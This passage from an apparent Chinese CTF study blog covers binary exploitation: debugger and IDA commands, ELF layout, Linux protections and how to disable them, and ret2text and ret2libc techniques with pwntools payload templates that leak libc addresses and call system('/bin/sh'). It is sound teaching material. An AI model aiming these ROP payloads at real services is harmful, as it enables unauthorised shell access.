href="https://www.cnblogs.com/ve1kcon/p/17812418.html">https://www.cnblogs.com/ve1kcon/p/17812418.html</a></p><table><thead><tr><th>快捷键</th><th>作用</th></tr></thead><tbody><tr><td>n</td><td>重命名变量&#x2F;函数</td></tr><tr><td>y</td><td>修改函数原型或者变量类型</td></tr><tr><td>tab</td><td>在反汇编窗口中，进行<strong>汇编指令</strong>与<strong>伪代码</strong>之间的切换</td></tr><tr><td>esc</td><td>翻页，返回前一页面</td></tr><tr><td>space</td><td>在反汇编窗口中，进行<strong>列表视图</strong>与<strong>图形视图</strong>之间的切换</td></tr><tr><td>f12</td><td>打开字符串窗口，可用于字符串搜索</td></tr><tr><td>&#x2F;</td><td>添加注释</td></tr></tbody></table><h5 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h5><p>参考文章：<a href="https://www.cnblogs.com/ve1kcon/p/17812420.html">https://www.cnblogs.com/ve1kcon/p/17812420.html</a></p><table><thead><tr><th>指令</th><th>作用</th></tr></thead><tbody><tr><td>gdb filename</td><td>进入调试可执行程序</td></tr><tr><td>r</td><td>开始&#x2F;重新运行程序</td></tr><tr><td>c</td><td>运行到断点&#x2F;结束</td></tr><tr><td>q</td><td>退出</td></tr><tr><td>n</td><td>单步调试</td></tr><tr><td>s</td><td>单步调试并跟进函数</td></tr><tr><td>p&#x2F;x</td><td>用于计算（相当于计算器）</td></tr><tr><td>vmmap</td><td>获取调试进程中的虚拟映射地址范围</td></tr><tr><td>x&#x2F;gx    x&#x2F;gi    x&#x2F;gs</td><td>以数据 &#x2F; 汇编 &#x2F; 字符串的形式查看内存（x&#x2F;20gx一次查看更多数据）</td></tr><tr><td>b *address &#x2F; function_name &#x2F; *$rebase(address)</td><td>绝对地址 &#x2F; 函数名 &#x2F; 相对地址下断点</td></tr><tr><td>fin</td><td>跳出当前函数，执行到函数返回处</td></tr><tr><td>context</td><td>重新打印页面信息</td></tr><tr><td>code</td><td>查看程序基址</td></tr><tr><td>libc</td><td>查看libc基址</td></tr></tbody></table><h5 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h5><p><code>checksec filename</code>查看架构、端序、保护</p><h4 id="elf文件格式"><a href="#elf文件格式" class="headerlink" title="elf文件格式"></a>elf文件格式</h4><ul><li><p><code>.init、.fini</code>：保存了进程初始化和结束所用的代码，这两个节通常都是由编译器自动添加</p></li><li><p><code>plt、got</code>：动态链接的跳转和全局入口表</p></li><li><p><code>.text</code>：代码段</p></li><li><p><code>.rodata</code>：保存了只读数据，可以读取但不能修改</p><p>例如示例代码中的<code>&quot;Result is: %d&quot;</code></p></li><li><p><code>.data</code>：已初始化的全局变量和局部静态变量都保存在<code>.data</code>段</p><p>例如示例代码中的<code>&quot;Hello world!&quot;</code></p></li><li><p><code>.bss</code>：未初始化的全局变量和局部静态变量默认值都为<code>0</code></p><p><code>.bss</code>段只是为未初始化的全局变量和局部静态变量预留位置没有内容，所以它在文件中也不占据空间</p><p>例如示例代码中的<code>buf</code></p></li></ul><h4 id="函数调用过程"><a href="#函数调用过程" class="headerlink" title="函数调用过程"></a>函数调用过程</h4><h5 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h5><p>指数据<strong>暂时存储</strong>的地方，所以才有<u>入栈、出栈</u>的说法，入栈和出栈都在栈顶（即将数据存放到数据暂存区的顶部以及从顶部取出数据），局部非静态变量存储在栈中</p><h5 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h5><h6 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h6><p><u>一个地址占<code>8</code>字节，可以使用<code>pwntools</code>的<code>p64</code>生成一个<code>64</code>位的地址</u></p><p><strong>栈</strong>：<code>rbp</code> -&gt; 栈底<code>rsp</code> -&gt; 栈顶</p><p><strong>当前执行指令寄存器</strong>：<code>rip</code></p><p><strong>传参</strong>：<code>rdi</code> -&gt; 一参<code>rsi</code> -&gt; 二参<code>rdx</code> -&gt; 三参</p><h6 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h6><p><u>一个地址占<code>4</code>字节，可以使用<code>pwntools</code>的<code>p32</code>生成一个<code>32</code>位的地址</u></p><p><strong>栈</strong>：<code>ebp</code>：栈底<code>esp</code>：栈顶</p><p><strong>当前执行指令寄存器</strong>：<code>eip</code></p><p><strong>传参</strong>：通过栈传参</p><h5 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h5><p>详细过程讲解见视频</p><img src="/2024/11/06/chong-sheng-zhi-wo-zai-yctu-zuo-pwn-shou-xi-lie-shi-pin-bi-ji/1.png" class><h4 id="linux保护机制"><a href="#linux保护机制" class="headerlink" title="linux保护机制"></a>linux保护机制</h4><ul><li><p><code>ASLR：Address Space Layout Randomization</code></p><p><code>linux</code>地址随机化，程序运行时的堆栈以及共享库的加载地址随机化</p><p>关闭<code>ASLR</code>:<code>sudo sysctl -w kernel.randomize_va_space=0</code></p></li><li><p><code>RELRO：RELocation Read-Only</code></p><ol><li><p><code>Full RELRO</code>：<code>got</code>表不可写</p></li><li><p><code>Partial RELRO</code></p><pre class="line-numbers language-none"><code class="language-none">gcc编译时关闭relro参数：-z norelro完全关闭-z lazy部分开启-z now完全开启<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol></li><li><p><code>stack</code></p><p><code>canary</code>，防止栈溢出，位于<code>rbp - 0x8</code></p><pre class="line-numbers language-none"><code class="language-none">gcc编译时关闭canary参数：-fno-stack-protector<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><code>NX：Non-eXecute</code></p><ol><li><p><code>NX enable</code>：堆栈不可执行，仅<code>.text</code>段可执行</p></li><li><p><code>No NX</code></p><pre class="line-numbers language-none"><code class="language-none">gcc编译时关闭NX参数：-z execstack允许在堆栈上执行代码-z noexecstack禁止在堆栈上执行代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol></li><li><p><code>PIE</code></p><p>gcc编译，code，获取地址，下断点</p><ol><li><p><code>PIE enabled</code>：程序地址随机化</p></li><li><p><code>No PIE</code></p><pre class="line-numbers language-none"><code class="language-none">gcc编译时关闭PIE参数：-no-pie<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol></li></ul><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><p>即返回到<code>text</code>段，劫持返回地址到后门（即覆盖<code>ret</code>为后门的地址）</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>输入长度没有被限制导致覆盖到<code>ret</code></p><p>例如：<code>gets</code>函数不限制输入长度</p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><ul><li>检查保护（确认<code>no pie</code>以及<code>no canary</code>）</li><li>确定后门地址、变量到栈底的距离（根据<code>IDA</code>中变量后的<code>rbp-xx</code>得到与栈底的距离为<code>xx</code>）</li><li>填充中间空间（变量到栈底的距离+<code>rbp</code>的长度）并覆盖<code>ret</code>为返回地址</li></ul><h4 id="交互脚本模板"><a href="#交互脚本模板" class="headerlink" title="交互脚本模板"></a>交互脚本模板</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./filename'</span><span class="token comment">#修改成可执行文件名</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token comment">#打远程时改成1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'ip'</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token comment">#打远程时修改ip和端口</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token comment">#在需要调试的地方加上dbg()</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-ret2libc"><a href="#3-ret2libc" class="headerlink" title="3.ret2libc"></a>3.ret2libc</h2><h3 id="前置基础-1"><a href="#前置基础-1" class="headerlink" title="前置基础"></a>前置基础</h3><h4 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h4><p><code>gadget</code>：程序本身或者<code>libc</code>中存在的一些汇编指令，每一条指令有其对应的地址，将这些<code>gadget</code>地址部署到栈中可以执行该地址中存放的汇编指令</p><p>​例如：<code>ret2text</code>就是执行程序本身有的<code>system(&quot;/bin/sh&quot;);</code>指令</p><p><code>ROP</code>：一种利用现有程序中的代码片段（即<code>gadget</code>）来构造攻击的技术，通过构造一系列的<code>gadget</code>来实现攻击目标，也可以控制程序执行好几段不相邻的程序已有的代码</p><p>​例如：在返回地址处按顺序填上函数<code>func1</code>、<code>func2</code>、<code>func3</code>的地址就会依次执行这三个函数，更多的是利用其中的汇编指令</p><h4 id="工具指令"><a href="#工具指令" class="headerlink" title="工具指令"></a>工具指令</h4><h5 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h5><p>获取<code>gadget</code>地址，<code>--binary</code>参数指定文件，可以是可执行文件或<code>libc</code>文件，<code>grep</code>用于筛选，<code>--string</code>用于筛选字符串</p><p>通过<code>pop rdi</code>可以将栈地址中的值传递给<code>rdi</code>寄存器，其他寄存器也同理，所以在构造<code>ROP</code>链时直接使用<code>p64(pop_rdi_ret) + p64(rdi_content)</code>即可控制<code>rdi</code>寄存器的值为<code>rdi_content</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$ROPgadget</span> <span class="token parameter variable">--binary</span> ./pwn <span class="token parameter variable">--only</span> <span class="token string">'pop|ret'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'rdi'</span><span class="token comment">#控制寄存器的值</span><span class="token variable">$ROPgadget</span> <span class="token parameter variable">--binary</span> ./pwn <span class="token parameter variable">--string</span> <span class="token string">'/bin/sh'</span><span class="token comment">#查找字符串</span><span class="token variable">$ROPgadget</span> <span class="token parameter variable">--binary</span> ./libc-2.35.so <span class="token parameter variable">--only</span> <span class="token string">'leave|ret'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'leave'</span><span class="token comment">#查找leave ret指令地址</span><span class="token variable">$ROPgadget</span> <span class="token parameter variable">--binary</span> ./pwn <span class="token parameter variable">--ropchain</span><span class="token comment">#生成现成的rop利用链直接getshell，适用于静态编译的程序</span><span class="token variable">$ROPgadget</span> <span class="token parameter variable">--binary</span> ./pwn <span class="token parameter variable">--only</span> <span class="token string">'ret'</span><span class="token comment">#查找ret指令的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="string"><a href="#string" class="headerlink" title="string"></a>string</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$strings</span> ./libc.so.6  <span class="token operator">|</span> <span class="token function">grep</span> GNU<span class="token comment">#获取libc版本</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h5><p>进入<code>glibc-all-in-one</code>文件夹下执行<code>./update_list</code>之后<code>cat list</code>确认是否有对应版本的<code>libc</code>，存在对应版本使用<code>./download libc版本名</code>进行下载，下载完成之后存在于<code>libs</code>文件夹下，需要用的时候将文件夹下的<code>libc</code>文件夹复制过去，下载失败可以直接复制下载地址到<code>windows</code>中下载再放到虚拟机里</p><p><strong>示例</strong></p><p>使用<code>strings</code>指令确定<code>libc</code>版本为<code>2.38-1ubuntu6</code>，使用<code>file</code>指令确定<code>32</code>位（也可以<code>checksec ./pwn</code>）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$strings</span> ./libc.so.6  <span class="token operator">|</span> <span class="token function">grep</span> GNU GNU C Library <span class="token punctuation">(</span>Ubuntu GLIBC <span class="token number">2.38</span>-1ubuntu6<span class="token punctuation">)</span> stable release version <span class="token number">2.38</span>.Compiled by GNU CC version <span class="token number">13.2</span>.0.<span class="token variable">$file</span> libc.so.6 libc.so.6: ELF <span class="token number">32</span>-bit LSB shared object, Intel <span class="token number">80386</span>, version <span class="token number">1</span> <span class="token punctuation">(</span>GNU/Linux<span class="token punctuation">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>495fc00b597566b5e14e221f563afe29ec1d8478, <span class="token keyword">for</span> GNU/Linux <span class="token number">3.2</span>.0, stripped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>确认<code>list</code>列表中存在该版本的<code>libc</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$cat</span> list    <span class="token number">2.23</span>-0ubuntu11.3_amd64<span class="token number">2.23</span>-0ubuntu11.3_i386<span class="token number">2.23</span>-0ubuntu3_amd64<span class="token number">2.23</span>-0ubuntu3_i386<span class="token number">2.27</span>-3ubuntu1.5_amd64<span class="token number">2.27</span>-3ubuntu1.5_i386<span class="token number">2.27</span>-3ubuntu1.6_amd64<span class="token number">2.27</span>-3ubuntu1.6_i386<span class="token number">2.27</span>-3ubuntu1_amd64<span class="token number">2.27</span>-3ubuntu1_i386<span class="token number">2.31</span>-0ubuntu9.12_amd64<span class="token number">2.31</span>-0ubuntu9.12_i386<span class="token number">2.31</span>-0ubuntu9.7_amd64<span class="token number">2.31</span>-0ubuntu9.7_i386<span class="token number">2.31</span>-0ubuntu9_amd64<span class="token number">2.31</span>-0ubuntu9_i386<span class="token number">2.35</span>-0ubuntu3.4_amd64<span class="token number">2.35</span>-0ubuntu3.4_i386<span class="token number">2.35</span>-0ubuntu3_amd64<span class="token number">2.35</span>-0ubuntu3_i386<span class="token number">2.37</span>-0ubuntu2.1_amd64<span class="token number">2.37</span>-0ubuntu2.1_i386<span class="token number">2.37</span>-0ubuntu2_amd64<span class="token number">2.37</span>-0ubuntu2_i386<span class="token number">2.38</span>-1ubuntu6_amd64<span class="token number">2.38</span>-1ubuntu6_i386<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下载该版本的<code>libc</code>，如果下载失败可以直接复制里面的链接<code>https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6_2.38-1ubuntu6_i386.deb</code>在<code>windows</code>里下载再存到虚拟机里，下载完成后位于<code>libs</code>文件夹中，需要使用时直接<code>cp -r ~/glibc-all-in-one/libs/2.38-1ubuntu6_i386 ./2.38</code>复制文件夹使用</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$./download <span class="token number">2.38</span>-1ubuntu6_i386                   Getting <span class="token number">2.38</span>-1ubuntu6_i386  -<span class="token operator">></span> Location: https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6_2.38-1ubuntu6_i386.deb  -<span class="token operator">></span> Downloading libc binary package  -<span class="token operator">></span> Extracting libc binary packagex - debian-binaryx - control.tar.zstx - data.tar.zst/home/starrysky/glibc-all-in-one  -<span class="token operator">></span> Package saved to libs/2.38-1ubuntu6_i386  -<span class="token operator">></span> Location: https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/libc6-dbg_2.38-1ubuntu6_i386.deb  -<span class="token operator">></span> Downloading libc debug package  -<span class="token operator">></span> Extracting libc debug packagex - debian-binaryx - control.tar.zstx - data.tar.zst/home/starrysky/glibc-all-in-one  -<span class="token operator">></span> Package saved to libs/2.38-1ubuntu6_i386/.debug<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="ldd"><a href="#ldd" class="headerlink" title="ldd"></a>ldd</h5><p>获取可执行文件的动态链接文件，包括<code>ld</code>和<code>libc</code>等</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$ldd</span> ./pwn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h5><p>更改可执行文件的动态链接文件，更改<code>ld</code>可以直接指定<code>ld</code>文件，而更改<code>libc</code>需要先使用<code>ldd</code>查看原<code>libc</code>作为<code>--replace-needed</code>选项的第一个参数，一般默认是<code>libc.so.6</code></p><p><strong>libc和ld要同时更改确保在同一版本</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$patchelf</span> --replace-needed libc.so.6 ./2.38/libc.so.6 ./pwn<span class="token comment">#更改libc</span><span class="token variable">$patchelf</span> --set-interpreter ./2.35/ld-linux-x86-64.so.2 ./pwn<span class="token comment">#更改ld</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="onegadget"><a href="#onegadget" class="headerlink" title="onegadget"></a>onegadget</h5><p>能直接<code>getshell</code>的<code>gadget</code>，<u>添加参数<code>-l2</code>可以获得更多</u></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$one_gadget</span> ./libc.so.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h4><p>参考文章：<a href="https://starrysky1004.github.io/2024/09/26/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/">https://starrysky1004.github.io/2024/09/26/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/</a></p><p>延迟绑定是一种在程序运行时才解析<strong>外部符号</strong>（如函数和变量）地址的技术，它允许程序在启动时不必立即加载所有动态链接库中的符号，从而提高程序的启动速度</p><p><code>c</code>语言内置的函数(例如<code>printf</code>）都是依赖于<code>libc</code>中的外部函数</p><h5 id="动态链接与静态链接"><a href="#动态链接与静态链接" class="headerlink" title="动态链接与静态链接"></a>动态链接与静态链接</h5><p><strong>动态链接</strong>是指在程序运行时才将程序与所需的动态链接库中的库函数链接起来的过程，动态链接的程序在启动时会加载所需的动态库（例如<code>libc</code>），并在运行时解析外部符号的地址</p><p><strong>静态链接</strong>在编译时将所有需要的库函数直接复制到可执行文件中，生成的可执行文件不依赖于外部的库文件，可以独立运行，但是会导致可执行文件体积增大</p><h5 id="plt与got"><a href="#plt与got" class="headerlink" title="plt与got"></a>plt与got</h5><p><strong>PLT（Procedure Linkage Table）</strong> 是一个代码段，包含了用于动态链接的跳转指令。每个需要动态链接的外部函数都会在<code>PLT</code>中有一个条目，当程序第一次调用这个函数时，<code>PLT</code>中的代码会被执行，这个代码会去查找并解析外部函数的实际地址，并将其存储在<code>GOT</code>中，以便后续调用时直接跳转到正确的地址</p><p><strong>GOT（Global Offset Table）</strong> 是一个数据段，存储了所有外部符号的地址。在程序启动时，<code>GOT</code>中的条目可能并不包含最终的地址，而是包含指向<code>PLT</code>中相应条目的指针。当<code>PLT</code>条目第一次被执行时，会将查找到的外部符号地址更新到<code>GOT</code>中，这样后续的调用就可以直接通过<code>GOT</code>找到正确的地址</p><h5 id="延迟绑定过程"><a href="#延迟绑定过程" class="headerlink" title="延迟绑定过程"></a>延迟绑定过程</h5><ol><li><strong>程序启动</strong>：程序启动时，动态链接器加载程序和所有依赖的动态库</li><li><strong>符号解析</strong>：当程序第一次调用一个外部函数时，<code>PLT</code>中的代码会被执行，查找并解析外部函数的实际地址</li><li><strong>地址存储</strong>：查找到的地址被存储在<code>GOT</code>中，以便后续调用</li><li><strong>直接调用</strong>：后续对同一外部函数的调用将直接通过<code>GOT</code>进行，无需再次解析</li></ol><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul><li>执行函数的<code>plt</code>会通过跳转<code>got</code>直接调用到该函数</li><li><code>got</code>表可写的情况下覆盖函数的<code>got</code>表为其他函数地址可以实现调用该函数时执行到其他函数</li></ul><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>目标是执行<code>system(&quot;/bin/sh&quot;);</code>，即执行<code>system</code>函数其一参为<code>&quot;/bin/sh&quot;</code></p><h4 id="有system和-x2F-bin-x2F-sh"><a href="#有system和-x2F-bin-x2F-sh" class="headerlink" title="有system和&#x2F;bin&#x2F;sh"></a>有system和&#x2F;bin&#x2F;sh</h4><p>延迟绑定部分提到，执行函数的<code>plt</code>可以直接调用到该函数，那么构造<code>rop</code>链就是要先控制一参<code>rdi</code>为<code>&quot;/bin/sh&quot;</code>的地址再填<code>system</code>的<code>plt</code></p><ul><li><p>控制一参</p><p>使用<code>ROPgadget</code>找到<code>pop rdi</code>的地址</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$ROPgadget</span> <span class="token parameter variable">--binary</span> ./pwn <span class="token parameter variable">--only</span> <span class="token string">'pop|ret'</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'rdi'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ps：<code>gadget</code>中含有<code>pop rdi</code>就行，但是有<code>pop</code>其他寄存器就需要在后面加上对应的值，例如<code>0x000ac112 : pop rdi ; pop rbx ; ret</code>，<code>pop rdi</code>之后还<code>pop rbx</code>，所以后面需要加两个地址，即<code>p64(0x000ac112) + p64(rdi_content) + p64(rbx_content)</code>，后面就可以继续加其他<code>gadget</code></p></li><li><p>找<code>&quot;/bin/sh&quot;</code>地址</p><p><code>&quot;/bin/sh&quot;</code>地址需要在<code>IDA</code>中查找，直接按<code>f12</code>找到对应地址</p></li><li><p>找<code>system</code>函数地址</p><p><code>pwntools</code>中可以直接获取<code>plt</code>和<code>got</code>的地址：<code>elf.plt[&#39;system&#39;]</code><code>elf.got[&#39;system&#39;]</code></p></li></ul><p>最终构造出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#ROPgadget --binary ./pwn --only 'pop|ret' | grep 'rdi' -> pop_rdi_ret</span>pop_rdi_ret <span class="token operator">=</span> bin_sh <span class="token operator">=</span> IDA中<span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>sh地址system_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> ? <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="有system无-x2F-bin-x2F-sh"><a href="#有system无-x2F-bin-x2F-sh" class="headerlink" title="有system无&#x2F;bin&#x2F;sh"></a>有system无&#x2F;bin&#x2F;sh</h4><p>缺少<code>/bin/sh</code>可以直接往程序中的一个地址写入<code>/bin/sh</code>，假设地址是<code>buf</code>，那么就要先构造<code>gets(buf)</code>，读取<code>/bin/sh</code>之后再执行<code>system(&#39;/bin/sh&#39;)</code>，其中<code>system</code>的一参就说<code>buf</code>，即<code>/bin/sh</code>的地址</p><ul><li>获取<code>gets</code>的<code>plt</code>地址：<code>elf.plt[&#39;gets&#39;]</code></li><li>设置<code>buf</code>的地址，从<code>IDA</code>中选取，可以从<code>bss</code>段中选取地址</li><li>获取<code>system</code>的<code>plt</code>地址：<code>elf.plt[&#39;system&#39;]</code></li><li>设置一参：<code>ROPgadget --binary ./pwn --only &#39;pop|ret&#39; | grep &#39;rdi&#39;</code></li></ul><p>最终构造：注意发送<code>/bin/sh</code>最后加上<code>\x00</code>截断字符串，在执行<code>rop</code>链的过程中会执行<code>gets(buf)</code>从输入流输入<code>buf</code>的值，此时输入<code>/bin/sh\x00</code>即可向<code>buf</code>输入字符串</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#ROPgadget --binary ./pwn --only 'pop|ret' | grep 'rdi' -> pop_rdi_ret</span>pop_rdi_ret <span class="token operator">=</span> buf <span class="token operator">=</span> gets_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'gets'</span><span class="token punctuation">]</span>system_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> ?p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>gets_plt<span class="token punctuation">)</span><span class="token comment">#gets(buf)</span>p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_plt<span class="token punctuation">)</span><span class="token comment">#system(buf)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="无system无-x2F-bin-x2F-sh"><a href="#无system无-x2F-bin-x2F-sh" class="headerlink" title="无system无&#x2F;bin&#x2F;sh"></a>无system无&#x2F;bin&#x2F;sh</h4><p>可执行文件中没有<code>system</code>，但是作为动态链接库的<code>libc</code>中有，所以直接执行<code>libc</code>中的<code>system</code>即可，所以思路就是先获取<code>libc</code>的基址，再计算<code>libc</code>中<code>system</code>和<code>/bin/sh</code>的地址，最后执行<code>system(&#39;/bin/sh&#39;)</code></p><p><code>got</code>部分提到<code>got</code>表存放了外部符号地址，即<code>libc</code>中的地址，所以如果能够泄露<code>got</code>表中的地址就能获取<code>libc</code>中某个函数的真实地址，再减去这个函数在<code>libc</code>中的偏移就能得到<code>libc</code>的基址，最后加上<code>system</code>函数的偏移就能得到<code>system</code>函数的地址</p><ul><li><p>泄露<code>got</code>表中函数的地址</p><p>需要用一个输出函数输出一个<code>got</code>表的地址，一般构造<code>puts(puts_got)</code>，最后还要再回到该函数继续利用栈溢出，即<code>p64(pop_rdi_ret) + p64(puts_got) + p64(puts) + p64(main)</code></p><p>接收该地址：基本就是一个固定用法<code>u64(r.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))</code></p></li><li><p>获取<code>libc</code>基址</p><p>标志：64位以<code>7f</code>开头，基址末尾三位是0</p><p>已知<code>puts</code>函数的真实地址和<code>puts</code>函数的偏移，<code>libc</code>的基址就等于真实地址减偏移</p><p>获取<code>puts</code>函数在<code>libc</code>中的偏移可以通过<code>libc = ELF(&#39;libc文件&#39;)</code>，然后<code>libc.sym[&#39;puts&#39;]</code>得到<code>puts</code>偏移</p><p>在打本地的时候如果修改了<code>libc</code>版本需要对应修改<code>ELF</code>里的文件路径，也可以直接在本地打通之后修改文件路径为远程的<code>libc</code>文件后直接打远程</p></li><li><p>获取<code>system</code>和<code>/bin/sh</code>地址：从<code>libc</code>获取地址需要<strong>加上基址</strong></p><p><code>system = libc.sym[&#39;system&#39;] + libc_base</code></p><p><code>bin_sh = libc.search(b&#39;/bin/sh\x00&#39;).__next__() + libc_base</code></p></li></ul><p>最终构造：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#ROPgadget --binary ./pwn --only 'pop|ret' | grep 'rdi' -> pop_rdi_ret</span>pop_rdi_ret <span class="token operator">=</span> main <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> 